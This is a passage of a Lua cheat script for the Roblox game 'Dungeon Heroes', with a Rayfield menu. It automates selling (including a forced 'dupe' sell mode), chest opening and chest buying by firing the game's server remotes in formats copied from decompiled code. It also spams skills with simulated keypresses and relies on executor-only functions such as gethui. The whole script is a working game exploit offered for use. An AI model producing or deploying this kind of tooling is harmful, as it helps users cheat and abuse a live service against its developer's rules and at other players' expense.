    -- RAYFIELD UI: MASTER, SOURCE & MULTI-CATEGORY (ALL WITH FLAGS)
    -- ==========================================
    UtilityTab:CreateToggle({
        Name = "Auto Sell (Master Switch)",
        CurrentValue = false,
        Flag = "V5_AutoSellMaster",
        Callback = function(Value)
            AutoSellEnabled = Value
            if Value then
                table.clear(RejectedSellUIDBlacklist)
                table.clear(BankProtectedUIDBlacklist)
            end
        end
    })

    UtilityTab:CreateDropdown({
        Name = "Select Sell Source (Where To Sell From)",
        Options = {
            "From Inventory Only",
            "From Bank Only (Auto-Bridge)",
            "From Both (Inventory + Bank)"
        },
        CurrentOption = "From Inventory Only",
        MultipleOptions = false,
        Flag = "V5_AutoSellSource",
        Callback = function(Option)
            if type(Option) == "table" then Option = Option[1] end
            if Option then
                SellSource = Option
                table.clear(RejectedSellUIDBlacklist)
                table.clear(BankProtectedUIDBlacklist)
            end
        end
    })

    UtilityTab:CreateToggle({
        Name = "Duplicate Sell Mode (Cosmetics Always Forced Dupe)",
        CurrentValue = false,
        Flag = "V5_DuplicateSell",
        Callback = function(Value)
            DuplicateSellEnabled = Value
            table.clear(RejectedSellUIDBlacklist)
        end
    })

    UtilityTab:CreateDropdown({
        Name = "Select Categories To Sell (Multi-Select)",
        Options = CategoryOptions,
        CurrentOption = {"Gear (Weapons + Armor Only)"},
        MultipleOptions = true,
        Flag = "V5_AutoSellCategoriesMulti",
        Callback = function(Options)
            local NewList = {}
            if type(Options) == "table" then
                for _, Opt in pairs(Options) do
                    if type(Opt) == "string" and FilterMap[Opt] then
                        table.insert(NewList, Opt)
                    end
                end
            elseif type(Options) == "string" and FilterMap[Options] then
                table.insert(NewList, Options)
            end
            SelectedCategoriesList = NewList
            table.clear(RejectedSellUIDBlacklist)
        end
    })

    -- ==========================================
    -- RAYFIELD UI: BANK AUTO-BRIDGE SETTINGS
    -- ==========================================
    UtilityTab:CreateSection("Bank Auto-Bridge Safety Settings")

    UtilityTab:CreateSlider({
        Name = "Bank Pull Micro-Batch Size (Safe Pull)",
        Range = {1, 15},
        Increment = 1,
        Suffix = " Items",
        CurrentValue = 5,
        Flag = "V5_BankPullBatchSize",
        Callback = function(Value)
            BankPullBatchSize = tonumber(Value) or 5
        end
    })

    UtilityTab:CreateToggle({
        Name = "Auto-Return To Bank If Post-Check Protected",
        CurrentValue = true,
        Flag = "V5_AutoReturnBank",
        Callback = function(Value)
            AutoReturnIfProtected = Value
        end
    })

    -- ==========================================
    -- RAYFIELD UI: SMART PROTECTION SHIELDS
    -- ==========================================
    UtilityTab:CreateSection("Smart Anti-Loss Protection Shields")

    UtilityTab:CreateToggle({
        Name = "Protect Gear With Socketed Gems",
        CurrentValue = true,
        Flag = "V5_ProtectGems",
        Callback = function(Value)
            ProtectSocketedGems = Value
        end
    })

    UtilityTab:CreateToggle({
        Name = "Protect Saved Gear Presets (All Presets)",
        CurrentValue = true,
        Flag = "V5_ProtectPresets",
        Callback = function(Value)
            ProtectGearPresets = Value
        end
    })

    UtilityTab:CreateToggle({
        Name = "Protect God-Roll Gear (4x / 5x Same Stat)",
        CurrentValue = true,
        Flag = "V5_ProtectGodRolls",
        Callback = function(Value)
            ProtectGodRolls = Value
        end
    })

    UtilityTab:CreateSlider({
        Name = "Same-Stat Count for God-Roll Shield",
        Range = {3, 5},
        Increment = 1,
        Suffix = "x Same Stat",
        CurrentValue = 4,
        Flag = "V5_GodRollCount",
        Callback = function(Value)
            MinMatchingStatsToProtect = tonumber(Value) or 4
        end
    })

    UtilityTab:CreateToggle({
        Name = "Enable Max Level Cap For Selling",
        CurrentValue = false,
        Flag = "V5_UseMaxLevelCap",
        Callback = function(Value)
            UseMaxSellLevelCap = Value
        end
    })

    UtilityTab:CreateSlider({
        Name = "Only Sell Gear/Skills At or Below Level",
        Range = {1, 500},
        Increment = 1,
        Suffix = " Lv",
        CurrentValue = 215,
        Flag = "V5_MaxSellLevel",
        Callback = function(Value)
            MaxSellLevel = tonumber(Value) or 215
        end
    })

    UtilityTab:CreateButton({
        Name = "Preview Matching Sell Count (Inv + Bank Scan)",
        Callback = function()
            RunAutoSell(true)
        end
    })

    -- ==========================================
    -- RAYFIELD UI: RARITIES (UNIQUE ID 8 PERMANENTLY BLOCKED)
    -- ==========================================
    UtilityTab:CreateSection("Sell Rarity Settings (Unique ID 8 Blocked)")

    local Rarities = {
        {Name = "Common (ID 1)", ID = 1},
        {Name = "Uncommon (ID 2)", ID = 2},
        {Name = "Rare (ID 3)", ID = 3},
        {Name = "Epic (ID 4)", ID = 4},
        {Name = "Legendary (ID 5)", ID = 5},
        {Name = "Mythic (ID 6)", ID = 6},
        {Name = "Primordial (ID 7)", ID = 7},
        -- Unique (ID 8) is PERMANENTLY OMITTED & HARD-BLOCKED!
        {Name = "Nightmare (ID 9)", ID = 9},
    }

    for _, Rarity in ipairs(Rarities) do
        UtilityTab:CreateToggle({
            Name = "Sell " .. Rarity.Name,
            CurrentValue = false,
            Flag = "V5_SellRarity_" .. tostring(Rarity.ID),
            Callback = function(Value)
                RarityConfig[Rarity.ID] = Value
                table.clear(RejectedSellUIDBlacklist)
            end
        })
    end

    -- ==========================================
    -- BACKGROUND LOOP
    -- ==========================================
    task.spawn(function()
        while true do
            task.wait(ScanDelay)
            if AutoSellEnabled and not IsRunningCycle then
                RunAutoSell(false)
            end
        end
    end)
end

ChestTab:CreateSection("Auto chest open")

do
-- Dungeon Heroes | Universal Parallel Auto Chest Opener (Exact Decompiled Logic)
-- Supports: Pet Chest, Skill Chests, Banana/Event Chests, Basic Chest, Aura Chest, Title Chest, Mega Chest
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local Player = Players.LocalPlayer
local Inventory = nil

local Remotes = ReplicatedStorage:WaitForChild("Remotes")
local OpenPetChest = Remotes:WaitForChild("OpenPetChest")
local OpenAuraChest = Remotes:WaitForChild("OpenAuraChest")
local OpenMegaChest = Remotes:WaitForChild("OpenMegaChest")
local OpenChest = Remotes:WaitForChild("OpenChest")

local ChestShop = require(ReplicatedStorage:WaitForChild("Systems"):WaitForChild("ChestShop"))
local ItemList = require(ReplicatedStorage:WaitForChild("WorldModules"):WaitForChild("Items"):WaitForChild("ItemList"))

local BATCH_SIZE = 5
local enabled = false
local session = 0
local Workers = {}
local StackListeners = {}

-- Exact Decompiled Category Detection (Current + Future Chests)
local function GetChestType(item)
	local countObj = item:FindFirstChild("Count")
	if not countObj or not countObj:IsA("ValueBase") then
		return nil
	end

	local uid = item:GetAttribute("ItemUid")
	local data = ItemList[item.Name]

	if type(data) == "table" then
		local cat = data.Category

		if cat == "Pet Chest" then
			return "Pet", uid
		elseif cat == "Chest" then
			-- SkillChest, FrozenSkillChest, GoldenSkillChest, BananaFoodChest & all Event Chests
			return "Standard", uid
		elseif cat == "Basic Chest" or cat == "AuraChest" or cat == "TitleChest" then
			return "Aura", uid
		elseif cat == "MegaChest" then
			return "Mega", uid
		end

		-- Future-proof check: agar future update mein naya chest category aaye jisme loot table ho
		if cat ~= "Armor" and cat ~= "Weapon" and cat ~= "Cosmetic" and cat ~= "Food" and cat ~= "Potion" and cat ~= "Booster" then
			if data.PossibleItems or data.PossibleItemsWithWeights or data.PossibleItemsIsGenerated then
				return "Standard", uid
			end
		end

		return nil
	end

	-- Fallback agar koi naya item ItemList mein na ho
	local lowerName = item.Name:lower()
	if not lowerName:find("chestplate") then
		if lowerName:find("petchest") then
			return "Pet", uid
		elseif lowerName:find("megachest") then
			return "Mega", uid
		elseif lowerName:find("aurachest") or lowerName:find("titlechest") or lowerName:find("basic") then
			return "Aura", uid
		elseif lowerName:find("chest") then
			return "Standard", uid
		end
	end

	return nil
end

-- Start independent worker for each chest stack
local function StartWorker(item, token)
	if Workers[item] == token then
		return
	end

	local chestType, uid = GetChestType(item)
	if not chestType then
		return
	end

	local countObj = item:FindFirstChild("Count")
	if not countObj or not countObj:IsA("ValueBase") or countObj.Value <= 0 then
		return
	end

	Workers[item] = token

	task.spawn(function()
		local failCount = 0

		while enabled and session == token and item.Parent == Inventory and countObj.Parent do
			local before = countObj.Value
			if before <= 0 then
				break
			end

			local amount = math.min(BATCH_SIZE, before)
			local changed = false

			-- Connect before sending request
			local connection = countObj:GetPropertyChangedSignal("Value"):Connect(function()
				if countObj.Value < before then
					changed = true
				end
			end)

			-- Send exact decompiled remote format
			local success, err = pcall(function()
				if chestType == "Pet" then
					OpenPetChest:FireServer(item, amount)
				elseif chestType == "Standard" then
					-- Decompiled format: 3rd argument MUST be a table { uid }
					if uid then
						OpenChest:InvokeServer(item.Name, amount, { uid })
					else
						ChestShop:OpenChest(Player, item.Name, amount, { item })
					end
				elseif chestType == "Mega" then
					OpenMegaChest:FireServer(uid or item, amount)
				elseif chestType == "Aura" then
					OpenAuraChest:FireServer(uid or item, amount)
				end
			end)

			if not success then
				connection:Disconnect()
				warn("Chest error:", item.Name, err)
				break
			end

			-- Wait for inventory count update
			local startTime = os.clock()
			while enabled and session == token and not changed and (os.clock() - startTime) < 3 do
				if countObj.Value < before or not item.Parent then
					changed = true
					break
				end
				task.wait()
			end

			connection:Disconnect()

			if not changed then
				failCount += 1
				if failCount >= 2 then
					warn("No inventory update (Level locked or unsupported):", item.Name)
					break
				end
				task.wait(0.2)
			else
				failCount = 0
			end
		end

		if Workers[item] == token then
			Workers[item] = nil
		end
	end)
end

-- Watch existing stack if more chests get added to the same stack later
local function WatchStack(item)
	if StackListeners[item] then
		return
	end

	task.spawn(function()
		local countObj = item:FindFirstChild("Count") or item:WaitForChild("Count", 2)
		if not countObj or not countObj:IsA("ValueBase") then
			return
		end

		if not GetChestType(item) then
			return
		end

		StackListeners[item] = countObj:GetPropertyChangedSignal("Value"):Connect(function()
			if enabled and countObj.Value > 0 and Workers[item] ~= session then
				StartWorker(item, session)
			end
		end)

		item.AncestryChanged:Connect(function(_, parent)
			if not parent and StackListeners[item] then
				StackListeners[item]:Disconnect()
				StackListeners[item] = nil
			end
		end)
	end)
end

-- Scan every chest stack in Inventory
local function ScanInventory(token)
	if not Inventory then
		return
	end

	for _, item in ipairs(Inventory:GetChildren()) do
		if not enabled or session ~= token then
			break
		end
		WatchStack(item)
		StartWorker(item, token)
	end
end

-- Detect Inventory & newly added chests in background
task.spawn(function()
	local PlayerGui = Player:WaitForChild("PlayerGui")
	local Profile = PlayerGui:WaitForChild("Profile")
	Inventory = Profile:WaitForChild("Inventory")

	Inventory.ChildAdded:Connect(function(item)
		WatchStack(item)
		if enabled then
			local token = session
			task.defer(function()
				if not item:FindFirstChild("Count") then
					item:WaitForChild("Count", 2)
				end
				if enabled and session == token then
					StartWorker(item, token)
				end
			end)
		end
	end)

	for _, item in ipairs(Inventory:GetChildren()) do
		WatchStack(item)
	end

	if enabled then
		ScanInventory(session)
	end
end)

-- Main toggle
ChestTab:CreateToggle({
	Name = "Auto Open All Chests",
	CurrentValue = false,
    Flag = "AutoOpenAllChests",
	Callback = function(value)
		enabled = value
		session += 1

		if enabled then
			local token = session
			ScanInventory(token)
		end
	end
})
end

ChestTab:CreateSection("Auto Buy Skill Chest")

do

-- ============================================================================
-- DUNGEON HEROES | SMART REMOTE SKILL CHEST BUYER (15 DUNGEONS + ELITE CHESTS)
-- ============================================================================
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")

local LocalPlayer = Players.LocalPlayer
local Systems = ReplicatedStorage:WaitForChild("Systems")
local ChestShop = require(Systems:WaitForChild("ChestShop"))
local DungeonsSys = require(Systems:WaitForChild("Dungeons"))
local ItemList = require(ReplicatedStorage:WaitForChild("WorldModules"):WaitForChild("Items"):WaitForChild("ItemList"))
local OpenChestRemote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("OpenChest")

-- ============================================================================
-- 1. CUSTOM 3-SECOND TOP UI NOTIFICATION SYSTEM (NON-RAYFIELD)
-- ============================================================================
local ActiveNotifGui = nil
local ActiveNotifToken = 0

local function ShowTopNotification(titleText, bodyText, isError)
	ActiveNotifToken += 1
	local currentToken = ActiveNotifToken

	if ActiveNotifGui and ActiveNotifGui.Parent then
		ActiveNotifGui:Destroy()
	end

	local parentGui = (gethui and gethui()) or LocalPlayer:FindFirstChildOfClass("PlayerGui") or CoreGui
	local screenGui = Instance.new("ScreenGui")
	screenGui.Name = "DH_SkillShopNotifier"
	screenGui.ResetOnSpawn = false
	screenGui.DisplayOrder = 999999
	screenGui.IgnoreGuiInset = true
	pcall(function()
		screenGui.Parent = CoreGui
	end)
	if not screenGui.Parent then
		screenGui.Parent = parentGui
	end
	ActiveNotifGui = screenGui

	local mainFrame = Instance.new("Frame")
	mainFrame.Name = "Banner"
	mainFrame.AnchorPoint = Vector2.new(0.5, 0)
	mainFrame.Position = UDim2.new(0.5, 0, 0, -90)
	mainFrame.Size = UDim2.new(0, 440, 0, 68)
	mainFrame.BackgroundColor3 = Color3.fromRGB(20, 22, 28)
	mainFrame.BorderSizePixel = 0
	mainFrame.Parent = screenGui

	local corner = Instance.new("UICorner")
	corner.CornerRadius = UDim.new(0, 10)
	corner.Parent = mainFrame

	local stroke = Instance.new("UIStroke")
	stroke.Thickness = 2
	stroke.Color = isError and Color3.fromRGB(255, 75, 75) or Color3.fromRGB(60, 220, 130)
	stroke.Parent = mainFrame

	local titleLabel = Instance.new("TextLabel")
	titleLabel.BackgroundTransparency = 1
	titleLabel.Position = UDim2.new(0, 14, 0, 8)
	titleLabel.Size = UDim2.new(1, -28, 0, 22)
	titleLabel.Font = Enum.Font.GothamBold
	titleLabel.TextSize = 15
	titleLabel.TextXAlignment = Enum.TextXAlignment.Left
	titleLabel.TextColor3 = isError and Color3.fromRGB(255, 95, 95) or Color3.fromRGB(80, 240, 150)
	titleLabel.Text = titleText
	titleLabel.Parent = mainFrame

	local bodyLabel = Instance.new("TextLabel")
	bodyLabel.BackgroundTransparency = 1
	bodyLabel.Position = UDim2.new(0, 14, 0, 30)
	bodyLabel.Size = UDim2.new(1, -28, 0, 32)
	bodyLabel.Font = Enum.Font.GothamMedium
	bodyLabel.TextSize = 13
	bodyLabel.TextWrapped = true
	bodyLabel.TextXAlignment = Enum.TextXAlignment.Left
	bodyLabel.TextYAlignment = Enum.TextYAlignment.Top
	bodyLabel.TextColor3 = Color3.fromRGB(235, 235, 240)
	bodyLabel.Text = bodyText
	bodyLabel.Parent = mainFrame

	-- Slide Down Animation
	TweenService:Create(
		mainFrame,
		TweenInfo.new(0.25, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
		{ Position = UDim2.new(0.5, 0, 0, 18) }
	):Play()

	-- Auto Disappear in 3 Seconds
	task.delay(3, function()
		if ActiveNotifToken ~= currentToken or not screenGui.Parent then
			return
		end
		local outTween = TweenService:Create(
			mainFrame,
			TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
			{ Position = UDim2.new(0.5, 0, 0, -90) }
		)
		outTween:Play()
		outTween.Completed:Wait()
		if screenGui.Parent then
			screenGui:Destroy()
		end
	end)
end

local function FormatNumber(n)
	local formatted = tostring(math.floor(tonumber(n) or 0))
	while true do
		local k
		formatted, k = string.gsub(formatted, "^(-?%d+)(%d%d%d)", "%1,%2")
		if k == 0 then break end
	end
	return formatted
end

-- ============================================================================
-- 2. HELPER FUNCTIONS FOR CURRENCIES, INVENTORY & CHEST PRICES
-- ============================================================================
local function GetProfile()
	local pGui = LocalPlayer:FindFirstChild("PlayerGui")
	return pGui and pGui:FindFirstChild("Profile")
end

local function GetPlayerLevel()
	local profile = GetProfile()
	local lvlObj = profile and profile:FindFirstChild("Level")
	return (lvlObj and tonumber(lvlObj.Value)) or 1
end

local function GetPlayerKeys()
	local profile = GetProfile()
	local currencies = profile and profile:FindFirstChild("Currencies")
	local keysObj = currencies and currencies:FindFirstChild("Keys")
	return (keysObj and tonumber(keysObj.Value)) or 0
end

local function GetInventoryItemCount(itemName)
	if not itemName then return 0 end
	local profile = GetProfile()
	local inv = profile and profile:FindFirstChild("Inventory")
	if not inv then return 0 end

	local total = 0
	for _, item in ipairs(inv:GetChildren()) do
		if item.Name == itemName then
			local countObj = item:FindFirstChild("Count")
			total += (countObj and tonumber(countObj.Value)) or 1
		end
	end
	return total
end

local function GetDynamicChestCosts(chestId, rawData)
	local playerLvl = GetPlayerLevel()
	local resolvedData = rawData

	-- Check level-scaled chest data from ChestShop
	if type(ChestShop.GetChestDataForLevel) == "function" then
		local ok, res = pcall(function()
			return ChestShop:GetChestDataForLevel(chestId, playerLvl)
		end)
		if (not ok or type(res) ~= "table") then
			ok, res = pcall(function()
				return ChestShop:GetChestDataForLevel(rawData, playerLvl)
			end)
		end
		if ok and type(res) == "table" then
			resolvedData = res
		end
	end

	local keyPrice = tonumber(resolvedData.Price) or tonumber(rawData.Price)

	if not keyPrice and type(ChestShop.GetChestPriceForLevel) == "function" then
		local ok, p = pcall(function()
			return ChestShop:GetChestPriceForLevel(chestId, playerLvl)
		end)
		if ok and type(p) == "number" then
			keyPrice = p
		end
	end

	local eliteKeyItem = resolvedData.EliteKeyItem or rawData.EliteKeyItem
	local eliteKeyPrice = tonumber(resolvedData.EliteKeyPrice) or tonumber(rawData.EliteKeyPrice) or (eliteKeyItem and 1 or 0)

	if eliteKeyItem and not keyPrice then
		if type(ChestShop.GetEliteChestKeysPrice) == "function" then
			local ok, ep = pcall(function()
				return ChestShop:GetEliteChestKeysPrice(resolvedData)
			end)
			if ok and type(ep) == "number" then
				keyPrice = ep
			end
		end
		keyPrice = keyPrice or 20000 -- Default Elite Skill Chest Key cost
	end

	return keyPrice or 0, eliteKeyItem, eliteKeyPrice
end

-- ============================================================================
-- 3. SCAN & SORT ALL 15 DUNGEON SKILL CHESTS (1ST TO 15TH LINE-WISE)
-- ============================================================================
local DUNGEON_PROGRESSION = {
	["ForestDungeon"]          = { Order = 1,  Name = "Forest Dungeon" },
	["MountainDungeon"]        = { Order = 2,  Name = "Mountain Dungeon" },
	["CoveDungeon"]            = { Order = 3,  Name = "Deadman's Cove" },
	["PirateDungeon"]          = { Order = 3,  Name = "Deadman's Cove" },
	["CastleDungeon"]          = { Order = 4,  Name = "Castle Dungeon" },
	["JungleDungeon"]          = { Order = 5,  Name = "Jungle Dungeon" },
	["AstralDungeon"]          = { Order = 6,  Name = "Astral Abyss" },
	["DesertDungeon"]          = { Order = 7,  Name = "Desert Dungeon" },
	["CaveDungeon"]            = { Order = 8,  Name = "Cave Dungeon" },
	["MushroomDungeon"]        = { Order = 9,  Name = "Mushroom Forest" },
	["GoldDungeon"]            = { Order = 10, Name = "Golden Realm" },
	["TwilightForestDungeon"]  = { Order = 11, Name = "Twilight Grove" },
	["CathedralDungeon"]       = { Order = 12, Name = "Cathedral Dungeon" },
	["OceanDungeon"]           = { Order = 13, Name = "Sunken (Ocean)" },
	["EnchantedForestDungeon"] = { Order = 14, Name = "Sylvan Glade" },
	["FrostDungeon"]           = { Order = 15, Name = "Frostheim Reach" }
}

local SkillChestList = {}
local DropdownOptionToChest = {}
local DropdownOptions = {}

local function BuildOrderedSkillChestList()
	table.clear(SkillChestList)
	table.clear(DropdownOptionToChest)
	table.clear(DropdownOptions)

	for itemId, data in pairs(ItemList) do
		if type(data) == "table"
			and data.Category == "Chest"
			and data.Type == "Skills"
			and not data.Disabled
			and not data.InDevelopment
			and not data.HideFromChestShop
			and not string.find(string.lower(itemId), "gauntlet")
		then
			local dungeonId = data.Dungeon
			local dInfo = dungeonId and DUNGEON_PROGRESSION[dungeonId]

			local dData = nil
			if dungeonId and type(DungeonsSys.GetDungeonData) == "function" then
				local ok, res = pcall(function()
					return DungeonsSys:GetDungeonData(dungeonId)
				end)
				if ok and type(res) == "table" then
					dData = res
				end
			end

			local reqLevel = (dData and tonumber(dData.RequiredLevel))
				or (data.LevelRange and tonumber(data.LevelRange.Min))
				or 1

			local minRange = (data.LevelRange and tonumber(data.LevelRange.Min)) or reqLevel
			local isElite = (data.EliteKeyItem ~= nil)

			-- Exact progression priority (1 to 15)
			local sortOrder = dInfo and dInfo.Order or nil
			if not sortOrder then
				if isElite then
					local lowerName = string.lower(itemId .. " " .. tostring(data.DisplayName or "") .. " " .. tostring(dungeonId or ""))
					if string.find(lowerName, "sunken") or string.find(lowerName, "ocean") or string.find(lowerName, "abyss") then
						sortOrder = 13
					elseif string.find(lowerName, "elderwood") or string.find(lowerName, "sylvan") or string.find(lowerName, "forest") then
						sortOrder = 14
					elseif string.find(lowerName, "frost") or string.find(lowerName, "rime") or string.find(lowerName, "frozen") then
						sortOrder = 15
					else
						sortOrder = 16
					end
				else
					sortOrder = 0 -- Sorted by minRange / Price below
				end
			end

			local dungeonDisplayName = (dInfo and dInfo.Name)
				or (dData and (dData.DisplayName or dData.Name))
				or (dungeonId and string.gsub(dungeonId, "Dungeon", ""))
				or ("Lvl " .. tostring(minRange) .. "+")

			local chestDisplayName = data.DisplayName or itemId
			local basePrice = tonumber(data.Price) or 0

			table.insert(SkillChestList, {
				Id = itemId,
				Data = data,
				ChestName = chestDisplayName,
				DungeonName = dungeonDisplayName,
				IsElite = isElite,
				EliteKeyItem = data.EliteKeyItem,
				ReqLevel = reqLevel,
				MinRange = minRange,
				BasePrice = basePrice,
				SortOrder = sortOrder
			})
		end
	end

	-- Sort strictly from 1st Dungeon to 15th Dungeon
	table.sort(SkillChestList, function(a, b)
		if a.IsElite ~= b.IsElite then
			return not a.IsElite -- Normal Dungeons (1-12) first, Elite Dungeons (13-15) last
		end
		if a.SortOrder ~= b.SortOrder and a.SortOrder > 0 and b.SortOrder > 0 then
			return a.SortOrder < b.SortOrder
		end
		if a.MinRange ~= b.MinRange then
			return a.MinRange < b.MinRange
		end
		if a.ReqLevel ~= b.ReqLevel then
			return a.ReqLevel < b.ReqLevel
		end
		if a.BasePrice ~= b.BasePrice then
			return a.BasePrice < b.BasePrice
		end
		return a.Id < b.Id
	end)

	for idx, entry in ipairs(SkillChestList) do
		local label
		if entry.IsElite then
			local eliteKeyData = ItemList[entry.EliteKeyItem]
			local eliteKeyName = (eliteKeyData and eliteKeyData.DisplayName) or entry.EliteKeyItem
			label = string.format("#%d | %s - %s [ELITE: %s]", idx, entry.DungeonName, entry.ChestName, eliteKeyName)
		else
			label = string.format("#%d | %s (Lvl %d+) - %s", idx, entry.DungeonName, entry.MinRange, entry.ChestName)
		end

		entry.Label = label
		DropdownOptionToChest[label] = entry
		table.insert(DropdownOptions, label)
	end
end

BuildOrderedSkillChestList()

-- ============================================================================
-- 4. BUY & OPEN EXECUTION ENGINE (BATCH SIZE x REPEAT COUNT)
-- ============================================================================
local SelectedChestEntry = SkillChestList[1]
local BatchSize = 5       -- 1 baari mein kitne kholne hain (1 to 5)
local RepeatTimes = 1     -- Kitni baar wo batch kholna hai
local IsBuying = false
local BuySession = 0

local function VerifyCanBuyBatch(entry, amountToOpen)
	if not entry then
		ShowTopNotification("Skill Chest Error", "Pehle Dropdown se koi Dungeon Skill Chest select karo!", true)
		return false
	end

	-- 1. Check Dungeon Level Requirement if applicable
	local playerLvl = GetPlayerLevel()
	if entry.Data.Dungeon then
		local ok, dData = pcall(function()
			return DungeonsSys:GetDungeonData(entry.Data.Dungeon)
		end)
		local reqLvl = (ok and dData and tonumber(dData.RequiredLevel)) or 0
		if reqLvl > 0 and playerLvl < reqLvl then
			ShowTopNotification(
				"Level Locked: " .. entry.ChestName,
				string.format("Tumhara Level %d hai, is chest ke liye Level %d chahiye!", playerLvl, reqLvl),
				true
			)
			return false
		end
	end

	-- 2. Check Normal Keys & Elite Key
	local keyPricePerChest, eliteKeyItem, eliteKeyPerChest = GetDynamicChestCosts(entry.Id, entry.Data)
	local neededKeys = keyPricePerChest * amountToOpen
	local currentKeys = GetPlayerKeys()

	local missingParts = {}

	if neededKeys > 0 and currentKeys < neededKeys then
		local shortKeys = neededKeys - currentKeys
		table.insert(missingParts, string.format(
			"%s Keys kam hain (Need: %s | Have: %s)",
			FormatNumber(shortKeys), FormatNumber(neededKeys), FormatNumber(currentKeys)
		))
	end

	if eliteKeyItem and eliteKeyPerChest > 0 then
		local neededElite = eliteKeyPerChest * amountToOpen
		local currentElite = GetInventoryItemCount(eliteKeyItem)
		if currentElite < neededElite then
			local shortElite = neededElite - currentElite
			local eliteData = ItemList[eliteKeyItem]
			local eliteDisplayName = (eliteData and eliteData.DisplayName) or eliteKeyItem
			table.insert(missingParts, string.format(
				"%dx %s kam hai (Need: %d | Have: %d)",
				shortElite, eliteDisplayName, neededElite, currentElite
			))
		end
	end

	if #missingParts > 0 then
		ShowTopNotification(
			"Missing Items for " .. entry.ChestName,
			table.concat(missingParts, "  |  "),
			true
		)
		return false
	end

	return true
end

local function RunSkillChestBuyer(token)
	local entry = SelectedChestEntry
	if not entry then
		IsBuying = false
		ShowTopNotification("Skill Chest Error", "Koi Dungeon Skill Chest select nahi hai!", true)
		return
	end

	local totalBatches = math.max(1, math.floor(RepeatTimes))
	local perBatch = math.clamp(math.floor(BatchSize), 1, 5)
	local totalOpened = 0

	for batchIndex = 1, totalBatches do
		if not IsBuying or BuySession ~= token then
			break
		end

		-- Pre-check currencies & keys before every batch
		if not VerifyCanBuyBatch(entry, perBatch) then
			IsBuying = false
			break
		end

		local keysBefore = GetPlayerKeys()
		local eliteBefore = entry.EliteKeyItem and GetInventoryItemCount(entry.EliteKeyItem) or 0

		local ok, result = pcall(function()
			-- ChestShop:OpenChest with 4th arg nil buys directly from shop & materializes skills
			if type(ChestShop.OpenChest) == "function" then
				return ChestShop:OpenChest(LocalPlayer, entry.Id, perBatch)
			else
				return OpenChestRemote:InvokeServer(entry.Id, perBatch)
			end
		end)

		local keysAfter = GetPlayerKeys()
		local eliteAfter = entry.EliteKeyItem and GetInventoryItemCount(entry.EliteKeyItem) or 0
		local currencySpent = (keysAfter < keysBefore) or (eliteAfter < eliteBefore)
		local gotItems = (type(result) == "table" and #result > 0)

		if not ok or (not gotItems and not currencySpent) then
			-- Re-verify if currency ran out or server rejected
			if VerifyCanBuyBatch(entry, perBatch) then
				ShowTopNotification(
					"Purchase Blocked: " .. entry.ChestName,
					"Server ne chest open nahi ki (Level requirement ya Inventory full check karo).",
					true
				)
			end
			IsBuying = false
			break
		end

		totalOpened += perBatch

		if batchIndex < totalBatches then
			task.wait(0.15)
		end
	end

	if totalOpened > 0 and BuySession == token then
		ShowTopNotification(
			"Skill Chests Opened!",
			string.format("Successfully opened %dx %s (%s)!", totalOpened, entry.ChestName, entry.DungeonName),
			false
		)
	end

	if BuySession == token then
		IsBuying = false
	end
end

-- ============================================================================
-- 5. RAYFIELD UI CONTROLS (DROPDOWN, SLIDERS, BUTTON / TOGGLE)
-- ============================================================================

	ChestTab:CreateDropdown({
		Name = "Select Dungeon Skill Chest (1 to 15)",
		Options = DropdownOptions,
		CurrentOption = DropdownOptions[1] and { DropdownOptions[1] } or {},
		MultipleOptions = false,
		Flag = "DungeonSkillChestDropdown",
		Callback = function(Option)
			local chosen = type(Option) == "table" and Option[1] or Option
			if chosen and DropdownOptionToChest[chosen] then
				SelectedChestEntry = DropdownOptionToChest[chosen]
			end
		end
	})

	ChestTab:CreateSlider({
		Name = "Chests Per Batch (1 Baari Me Kitna Kholna Hai)",
		Range = {1, 5},
		Increment = 1,
		Suffix = "Chests",
		CurrentValue = 5,
		Flag = "SkillChestBatchSize",
		Callback = function(Value)
			BatchSize = Value
		end
	})

	ChestTab:CreateSlider({
		Name = "Repeat Times (Kitni Baar Kholna Hai)",
		Range = {1, 100},
		Increment = 1,
		Suffix = "Times",
		CurrentValue = 1,
		Flag = "SkillChestRepeatTimes",
		Callback = function(Value)
			RepeatTimes = Value
		end
	})

	ChestTab:CreateButton({
		Name = "Buy & Open Selected Skill Chest",
		Callback = function()
			if IsBuying then
				-- Agar pehle se chal raha hai toh dobara click karne pe stop kar dega
				IsBuying = false
				BuySession += 1
				ShowTopNotification("Stopped", "Skill Chest opening रोक di gayi hai.", true)
				return
			end

			IsBuying = true
			BuySession += 1
			local token = BuySession
			task.spawn(function()
				RunSkillChestBuyer(token)
			end)
		end
	})
end

UtilityTab:CreateSection("Auto Skill Cast")

local VirtualInputManager =
game:GetService("VirtualInputManager")

local AutoSkillEnabled = false
local SkillRunId = 0

-- Configuration
local KEYS = {
Enum.KeyCode.E,
Enum.KeyCode.R,
Enum.KeyCode.F,
Enum.KeyCode.X,
Enum.KeyCode.C
}

local HoldTime = 0.05
local Delay = 0.1

-- Auto Skill Function
local function StartSkillSpam()
SkillRunId += 1
local CurrentRun = SkillRunId

AutoSkillEnabled = true  

task.spawn(function()  
    while AutoSkillEnabled and SkillRunId == CurrentRun do  

        for _, Key in ipairs(KEYS) do  

            if not AutoSkillEnabled  
            or SkillRunId ~= CurrentRun then  
                break  
            end  

            -- Key Press  
            pcall(function()  
                VirtualInputManager:SendKeyEvent(  
                    true,  
                    Key,  
                    false,  
                    game  
                )  
            end)  

            task.wait(HoldTime)  

            -- Key Release  
            pcall(function()  
                VirtualInputManager:SendKeyEvent(  
                    false,  
                    Key,  
                    false,  
                    game  
                )  
            end)  

            task.wait(Delay)  
        end  
    end  
end)

end

-- Toggle
UtilityTab:CreateToggle({
Name = "Auto Skill Spam",
CurrentValue = false,
Flag = "AutoSkillSpam",

Callback = function(Value)  

    if Value then  
        StartSkillSpam()  
        print("Auto Skills: ON")  
    else  
        AutoSkillEnabled = false  
        SkillRunId += 1  

        -- Release all keys when disabled  
        for _, Key in ipairs(KEYS) do  
            pcall(function()  
                VirtualInputManager:SendKeyEvent(  
                    false,  
                    Key,  
                    false,  
                    game  
                )  
            end)  
        end  

        print("Auto Skills: OFF")  
    end  
end

})


-- ================ Auto Dungeon Start ========================
